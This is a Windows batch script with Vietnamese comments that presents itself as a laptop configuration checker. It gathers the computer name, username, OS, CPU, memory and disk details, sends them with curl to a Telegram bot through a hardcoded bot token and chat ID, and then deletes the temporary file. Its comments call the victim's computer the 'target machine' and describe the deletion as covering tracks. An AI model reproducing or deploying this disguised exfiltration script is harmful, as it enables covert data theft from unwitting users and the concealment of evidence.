@echo off
title Kiem Tra Cau Hinh Laptop
color 0A

# Bước 1: Thu thập thông tin cấu hình và lưu tạm vào ổ đĩa C của máy mục tiêu
set "temp_file=%TEMP%\cauhinhlap.txt"

(
echo ===================================================
echo          THONG TIN CAU HINH LAPTOP
echo ===================================================
echo Thoi gian: %date% %time%
echo May tinh: %computername%
echo User dang dung: %username%
echo ---------------------------------------------------
wmic os get Caption,OSArchitecture /value | findstr "="
wmic cpu get Name /value | findstr "="
wmic computersystem get TotalPhysicalMemory /value | findstr "="
wmic diskdrive get Model,Size /value | findstr "="
) > "%temp_file%"

echo Dang dong bo du lieu len he thong...

# Bước 2: Cấu hình Telegram
set "TOKEN=8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE"
set "CHAT_ID=6473475153"

# Bước 3: Dùng curl có sẵn của Windows để bắn file về điện thoại của bạn
curl -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
     -F "chat_id=%CHAT_ID%" ^
     -F "document=@%temp_file%" ^
     -F "caption= Mau thong tin cau hinh moi tu máy %computername%" >nul

# Bước 4: Xóa file tạm trên máy mục tiêu để dọn dẹp dấu vết
del "%temp_file%"

echo.
echo Tac vu hoan thanh!
pause
